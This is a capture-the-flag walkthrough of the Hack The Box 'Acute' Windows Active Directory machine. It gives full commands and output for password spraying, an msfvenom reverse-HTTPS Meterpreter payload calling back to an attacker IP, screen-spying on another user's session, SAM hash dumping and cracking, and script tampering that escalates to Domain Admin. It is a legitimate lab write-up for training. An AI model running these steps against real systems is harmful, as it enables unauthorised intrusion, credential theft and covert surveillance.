{% include toc icon="cog" title="Acute Solution" %}

The [Acute](https://app.hackthebox.com/machines/acute) machine has been created by [dmw0ng](https://app.hackthebox.com/users/610173). This is a **hard** Windows Machine with a strong focus on Active Directory enumeration and exploitation. However, this machine is more a CTF than a real world scenario.

If you didn't solve this challenge and just look for answers, first, you should take a look at this [mind map](https://github.com/Orange-Cyberdefense/ocd-mindmaps/blob/main/img/pentest_ad_dark_2023_02.svg) from [Orange Cyberdefense](https://github.com/Orange-Cyberdefense) and try again. It could give you some hints about interesting attack paths when dealing with an Active Directory.

**Note:** All the actions performed against the target machine have been done with a standard *Kali Linux* machine. You can download Kali from the official website [here](https://www.kali.org/).

# Reconnaissance

In a penetration test or red team, reconnaissance consists of techniques that involve adversaries actively or passively gathering information that can be used to support targeting. 

This information can then be leveraged by an adversary to aid in other phases of the adversary lifecycle, such as using gathered information to plan and execute initial access, to scope and prioritize post-compromise objectives, or to drive and lead further reconnaissance efforts. Here, our only piece of information is an IP address. 

## Scan with Nmap

Let's start with a classic service scan with [Nmap](https://nmap.org/). Note the **-sV** switch which enables *version detection* and allows Nmap to check its internal database to try to determine the service protocol, application name and version number.

**Note:** Always allow a few minutes after the start of the HTB box to make sure that all the services are properly running. If you scan the machine right away, you may miss some ports that should be open.
{: .notice--info}

```bash
$ nmap -Pn -sV 10.129.136.40
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-03 08:25 EDT
Nmap scan report for 10.129.136.40
Host is up (0.025s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT    STATE SERVICE  VERSION
443/tcp open  ssl/http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.83 seconds
```

**Remember:** By default, **Nmap** will scans the 1000 most common TCP ports on the targeted host(s). Make sure to read the [documentation](https://nmap.org/docs.html) if you need to scan more ports or change default behaviors.
{: .notice--warning}

Here, we can see that we have the **HTTPS** (443/TCP) port open.

## HTTP Recon

If we take a closer look at the certificate on "https://10.129.136.40", we can see its CN: 
- **atsserver.acute.local**.

![image-center](/images/htb/htb_acute_cert.png){: .align-center}

Let's add this domain to our `/etc/hosts` file with the following command:
- `echo "10.129.136.40 atsserver.acute.local" | sudo tee --append /etc/hosts`

Now, if we connect to "https://atsserver.acute.local", we should have something:

![image-center](/images/htb/htb_acute_website.png){: .align-center}

By taking a look at "https://atsserver.acute.local/about.html", we were able to gather some information.

![image-center](/images/htb/htb_acute_about.png){: .align-center}

Some usernames and a **docx** file:

- https://atsserver.acute.local/New_Starter_CheckList_v7.docx

## Information Gathering

Using `exiftool` on the file showed two interesting information:

- The **Creator** field, which contains the potential username format
- The **Description** field, which contains the name of the box

```

The file itself contains lots of information, including the following excerpts:

![image-center](/images/htb/htb_acute_word_1.png){: .align-center}

Here we have a potential default password, `Password1!`, which could be used for a password spraying attack.

![image-center](/images/htb/htb_acute_word_2.png){: .align-center}

Some information about a configuration named **dc_managed** on a PowerShell Web Access interface.

![image-center](/images/htb/htb_acute_word_3.png){: .align-center}

A link: **https://atsserver.acute.local/Acute_Staff_Access**

# Initial Access

With the gathered information, we can try to get access on the target machine. First, we will explore the discovered link.

## PowerShell Web Access

The discovered link, "https://atsserver.acute.local/Acute_Staff_Access", lead to a PowerShell Web Access interface.

![image-center](/images/htb/htb_acute_pswa.png){: .align-center}

Luckily for us, we have a username list, a default password and the machine name (found in the **docx** metadata). Using these information, we can build a list of potential username.

```text
AWallace
CHall
EDavies
IMonks
JMorgan
LHopkins
```

After a few try, we found a valid combination `EDavies:Password1!`.

![image-center](/images/htb/htb_acute_pswa_auth.png){: .align-center}

Finally, we got a shell. 

![image-center](/images/htb/htb_acute_pswa_edavies.png){: .align-center}

After looking , we found two interesting things. First, a file named **C:\Utils\desktop.ini**.

```bash
[.ShellClassInfo]

InfoTip=Directory for Testing Files without Defender
```

Basically, it means that Windows Defender does not seem to scan the **C:\Utils** folder for malwares.

Second, by looking at the process list, we can see a Session Id of **1** which mean someone is connected to this machine.

![image-center](/images/htb/htb_acute_process.png){: .align-center}

We can confirm this assumption by using the `qwinsta` command which can displays information about sessions on a server.

```bash
PS C:\Users\edavies\Documents> qwinsta /server:127.0.0.1

 SESSIONNAME       USERNAME                 ID  STATE   TYPE        DEVICE 

 console           edavies                   1  Active                      
```

So, it seems it's another user using our current credentials. Given the processes running on this session (like **msedge.exe**), as it is a CTF box, we should probably try to spy on this session.

## Spying with Metasploit

While our PSWA shell does not give us the necessary tools to spy on this user, we could use a Meterpreter shell and the `screenshare` module. This module allows us to view and control the screen of the target computer via a local browser window. 

First, let's generate a Meterpreter payload. A classic reverse HTTPS executable will do the trick:

```bash
$ sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.14.10 LPORT=443 EXITFUNC=thread -f exe -o /var/www/html/rev_shell.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 636 bytes
Final size of exe file: 7168 bytes
Saved as: /var/www/html/rev_shell.exe
```

Then, using the `curl` command, we can download our payload in the **C:\Utils** folder which is not monitored by Windows Defender. Note that the payload was hosted on the Kali machine using the **apache2** service pre-installed on the box.

![image-center](/images/htb/htb_acute_msf.png){: .align-center}

Finally, we set up a handler on our machine and execute the payload.

```bash
$ sudo msfconsole -q -x "use multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_https; set LHOST tun0; set LPORT 443; run"
[*] Using configured payload generic/shell_reverse_tcp
PAYLOAD => windows/x64/meterpreter/reverse_https

meterpreter > getuid 
Server username: ACUTE\edavies
```

Nice, we got a callback and a shell. Using the `ps` command, we will now identify a process executed by the other user and migrate.

```bash
meterpreter > ps

```

Here, **msedge.exe** is a safe bet. We just need to use the `migrate` command and the target PID. Then, we can execute `screenshare` and start spying on the user.


```bash
meterpreter > migrate 3736
[*] Migrating from 1524 to 3736...
[*] Migration completed successfully.
meterpreter > screenshare 
[*] Preparing player...
[*] Opening player at: /var/www/html/VYLgFLQr.html
[*] Streaming...
```

The streaming will be available locally at the address specified by the Meterpreter shell:
- http://localhost/VYLgFLQr.html

After a few minutes, we can see that the user is running multiple command in a PowerShell shell, which seems to contain a cleartext password for the **imonks** user.

![image-center](/images/htb/htb_acute_screen.png){: .align-center}

## Lateral Movement

Back to our PSWA, let's use the recovered credentials to see if we can get other privileges.

```powershell
$Pass = ConvertTo-SecureString "W3_4R3_th3_f0rce." -AsPlainText -force
$Creds = New-Object System.Management.Automation.PSCredential ("acute\imonks", $Pass)
Invoke-Command -computername ATSSERVER -ConfigurationName dc_manage -ScriptBlock {whoami} -credential $Creds
```

![image-center](/images/htb/htb_acute_imonks.png){: .align-center}

Looks good, however, the user has some restriction on the command we can execute. But, we already knew that some user had restriction by looking at the information in the **DOCX** file. 

Now, let's see which commands we can execute by looking at the **dc_manage** configuration.

```powershell
Invoke-Command -computername ATSSERVER -ConfigurationName dc_manage -ScriptBlock {Get-Command} -credential $Creds
```

![image-center](/images/htb/htb_acute_command.png){: .align-center}

Not a lot, but enough. Let's start by looking around. Our first target will be the **C:\Users\imonks\Desktop** folder.

```powershell
Invoke-Command -computername ATSSERVER -ConfigurationName dc_manage -ScriptBlock {Get-ChildItem C:\Users\imonks\Desktop} -credential $Creds
```

![image-center](/images/htb/htb_acute_wm_script.png){: .align-center}

**First flag**! We also have access to a file named **wm.ps1**, let's see what kind of information it contains.

```powershell
Invoke-Command -computername ATSSERVER -ConfigurationName dc_manage -ScriptBlock {Get-Content C:\Users\imonks\Desktop\wm.ps1} -credential $Creds
```

![image-center](/images/htb/htb_acute_wm_content.png){: .align-center}

So, we have the following file containing the **acute\jmorgan** credentials.

```powershell
$securepasswd = '01000000d08c9ddf0115d1118c7a00c04fc297eb0100000096ed5ae76bd0da4c825bdd9f24083e5c0000000002000000000003660000c00000001000000080f704e251793f5d4f903c7158c8213d0000000004800000a000000010000000ac2606ccfda6b4e0a9d56a20417d2f67280000009497141b794c6cb963d2460bd96ddcea35b25ff248a53af0924572cd3ee91a28dba01e062ef1c026140000000f66f5cec1b264411d8a263a2ca854bc6e453c51'
$passwd = $securepasswd | ConvertTo-SecureString
$creds = New-Object System.Management.Automation.PSCredential ("acute\jmorgan", $passwd)
Invoke-Command -ScriptBlock {Get-Volume} -ComputerName Acute-PC01 -Credential $creds
```

Maybe this user has some interesting privileges. Let's check the **Administrators** group with `net localgroup administrators`.

![image-center](/images/htb/htb_acute_admin_1.png){: .align-center}

Awesome! It means that any command executed in this script will be executed as local administrator and given we have read/write access on it, we can modify it.

We could edit **wm.ps1** by replacing the current command, `Get-Volume`, to `net localgroup administrators edavies /add` and get more privileges. This can easily be done, even with the current restricted command set.

```powershell
Invoke-Command -Computername ATSSERVER -ConfigurationName dc_manage -ScriptBlock {((Get-Content "c:\Users\imonks\Desktop\wm.ps1" -Raw) -replace 'Get-Volume','net localgroup administrators edavies /add') | set-content -path c:\users\imonks\Desktop\wm.ps1} -credential $Creds

Invoke-Command -ComputerName ATSSERVER -ConfigurationName dc_manage -ScriptBlock{C:\Users\imonks\Desktop\wm.ps1} -Credential $Creds
```

Now, we can check if we were added to the **Aministrators** group.

![image-center](/images/htb/htb_acute_admin_2.png){: .align-center}

Nice! However, for the *Administrator* permission to take effect, you will need to logoff and log back in as **edavis**. Then, we can re-execute our Metrerpreter payload to get an elevated shell.

```bash
msf6 exploit(multi/handler) > run

[*] Started HTTPS reverse handler on https://10.10.14.10:443
[!] https://10.10.14.10:443 handling request from 10.129.136.40; (UUID: cowqsnxo) Without a database connected that payload UUID tracking will not work!

```

# Privilege Escalation

Now that we have an elevated shell, let's execute `hashdump` to extract the SAM database.

```bash
meterpreter > hashdump 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:a29f7623fd11550def0192de9246f46b:::

Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Natasha:1001:aad3b435b51404eeaad3b435b51404ee:29ab86c5c4d2aab957763e5c1720486d:::

```

Given we cannot remotely connect to the target machine, we will have to try to crack the password and see if we can compromise another account.

```bash
$ john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
Using default input encoding: UTF-8
Loaded 4 password hashes with no different salts (NT [MD4 256/256 AVX2 8x3])

Warning: passwords printed above might not be all those cracked
Use the "--show --format=NT" options to display all of the cracked passwords reliably
Session completed. 
```

We got a password for the *Administrator* account. Maybe it is re-used on another account.

## Password Re-use

By trying the password on the previously discovered users, we found an account using the same password, **AWallace**.

```powershell
$Pass = ConvertTo-SecureString "Password@123" -AsPlainText -Force 
$Creds = New-Object System.Management.Automation.PSCredential ("Acute\AWallace", $Pass)
Invoke-Command -ComputerName ATSSERVER -ConfigurationName dc_manage -ScriptBlock {whoami} -Credential $Creds
```

With our new privileges, we were able to find a readable file named **keepmeon.bat**. Let's extract its content.

```powershell
Invoke-Command -ComputerName ATSSERVER -ConfigurationName dc_manage -ScriptBlock {Get-Content 'C:\Program Files\Keepmeon\keepmeon.bat'} -Credential $Creds
```

Here is the content of the file:

```bash
REM This is run every 5 minutes. For Lois use ONLY
@echo off
 for /R %%x in (*.bat) do (
 if not "%%x" == "%~0" call "%%x"
)
```

As per the description of the script, it seems like this script is executed every 5 minutes **Lois** and run every BAT script present in the **C:\Program Files\Keepmeon** folder. If we check the **DOCX** file, we can see a reference to this user.

![image-center](/images/htb/htb_acute_word_4.png){: .align-center}

**Lois** has access to a group related to **site admin**. Let's list the groups present on the domain and see if we can find something.

```powershell
Invoke-Command -ComputerName ATSSERVER -ConfigurationName dc_manage -ScriptBlock {net group /domain} -Credential $Creds
```

![image-center](/images/htb/htb_acute_groups.png){: .align-center}

Ok, there is a group named **Site_Admin**. Let's check the details of this specific group.

```powershell
Invoke-Command -ComputerName ATSSERVER -ConfigurationName dc_manage -ScriptBlock {net group Site_Admin /domain} -Credential $Creds
```

![image-center](/images/htb/htb_acute_site_admin.png){: .align-center}

By looking at the description, we can see **This has access to Domain Admin group**. It means that if we add our user to this group, we will get DA privileges.

As we have write privileges on the **C:\Program Files\Keepmeon** folder, we can create a new BAT script with the following command:
- `net group site_admin imonks /add /domain`

```powershell
Invoke-Command -ComputerName ATSSERVER -ConfigurationName dc_manage -ScriptBlock {Set-Content -Path 'c:\Program Files\Keepmeon\imonks.bat' -Value 'net group site_admin imonks /add /domain'} -Credential $Creds
``` 

Now we wait 5 minutes and check if we were added to the **Domain Admins** group. 

```powershell
Invoke-Command -ComputerName ATSSERVER -ConfigurationName dc_manage -ScriptBlock {net group "Domain Admins" /domain} -Credential $Creds
```

![image-center](/images/htb/htb_acute_da.png){: .align-center}

Awesome, now we can get the **second flag** and finish the challenge.

```powershell
Invoke-Command -ComputerName ATSSERVER -ConfigurationName dc_manage -ScriptBlock {get-childitem C:\Users\Administrator\Desktop\} -Credential $Creds
```
![image-center](/images/htb/htb_acute_root.png){: .align-center}

Awesome! I hope you enjoyed it, I know I did :)
